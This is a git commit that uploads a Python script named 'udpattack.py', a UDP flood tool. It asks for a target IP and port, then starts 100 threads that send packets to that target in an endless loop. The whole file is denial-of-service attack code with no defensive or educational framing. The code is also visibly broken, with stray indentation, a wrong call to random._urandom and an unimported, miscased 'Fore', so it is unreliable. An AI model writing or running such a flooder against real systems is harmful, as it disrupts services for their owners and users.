e31360b52c525ed69ece92b49b9f1d03fe71a760
DARKZ12 <96714244+DARKZ12@users.noreply.github.com>
2022-02-21 08:53:23 +0700

    Add files via upload

---
+++ udpattack.py
@@ -0,0 +1,27 @@
+#!/usr/bin/env python3
+#Code by DauB
+import random
+import socket
+import threading
+
+        print("UDP FLOOD")
+        ip = str(input(" IP:"))
+        port = int(input(" PORT:"))
+
+        def run2():
+            data = random._urandom(1024, 65000)
+            while True:
+                try:
+                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                    s.connect((ip,port))
+                    s.send(data)
+                    for x in range(100):
+                        s.send(data)
+                    print(Fore.Blue + '[UDP]' + Fore.GREEN + '> Send Packet')
+                except:
+                    s.close()
+                    print(Fore.BLUE + '[UDP]' + Fore.GREEN + '> Send Packet')
+
+        for y in range(100):
+                th = threading.Thread(target = run2)
+                th.start()
